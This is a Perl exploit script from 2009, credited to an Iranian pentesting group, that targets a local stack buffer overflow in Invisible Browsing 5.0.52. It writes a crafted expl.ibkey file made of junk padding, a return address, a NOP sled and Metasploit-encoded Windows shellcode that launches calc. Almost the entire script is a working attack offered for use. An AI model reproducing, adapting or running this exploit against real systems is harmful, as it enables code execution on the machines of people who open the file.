#!/usr/bin/perl

print qq(
  ############################################################
  ##                Iranian Pentesters Home                 ##
  ##                   Www.Pentesters.Ir                    ##
  ##                  PLATEN -[ H.jafari ]-                 ## 
  ## Invisible Browsing 5.0.52 (.ibkey) Local BoF Exploit   ##
  ## bug found & exploited by:  PLATEN                      ##
  ## E-mail && blog:                                        ##
  ## hjafari.blogspot.com                                   ##
  ## platen.secure[at]gmail[dot]com                         ## 
  ## Greetings: Cru3l.b0y, b3hz4d, Cdef3nder                ##
  ## and all members in Pentesters.ir                       ##
  ############################################################
);
# Note: I just test this version
$junk  ="\x41"x 5000;
$ret   = "\x93\x43\x92\x7c";
$nop   = "\x90" x 50;
# win32_exec - Size=160
#EXITFUNC=seh CMD=calc  
#Encoder=PexFnstenvSub http://metasploit.com
$shellcode =
"\x31\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x38".
"\x78\x73\x8a\x83\xeb\xfc\xe2\xf4\xc4\x90\x37\x8a\x38\x78\xf8\xcf".
"\x04\xf3\x0f\x8f\x40\x79\x9c\x01\x77\x60\xf8\xd5\x18\x79\x98\xc3".
"\xb3\x4c\xf8\x8b\xd6\x49\xb3\x13\x94\xfc\xb3\xfe\x3f\xb9\xb9\x87".
"\x39\xba\x98\x7e\x03\x2c\x57\x8e\x4d\x9d\xf8\xd5\x1c\x79\x98\xec".
"\xb3\x74\x38\x01\x67\x64\x72\x61\xb3\x64\xf8\x8b\xd3\xf1\x2f\xae".
"\x3c\xbb\x42\x4a\x5c\xf3\x33\xba\xbd\xb8\x0b\x86\xb3\x38\x7f\x01".
"\x48\x64\xde\x01\x50\x70\x98\x83\xb3\xf8\xc3\x8a\x38\x78\xf8\xe2".
"\x04\x27\x42\x7c\x58\x2e\xfa\x72\xbb\xb8\x08\xda\x50\x88\xf9\x8e".
"\x67\x10\xeb\x74\xb2\x76\x24\x75\xdf\x1b\x12\xe6\x5b\x78\x73\x8a";
open(fhandle,'>>expl.ibkey');
print fhandle $junk.$ret.$nop.$shellcode;
close(fhandle);
print "\n  [+] File created successfully: expl.ibkey \n";

# milw0rm.com [2009-09-14]
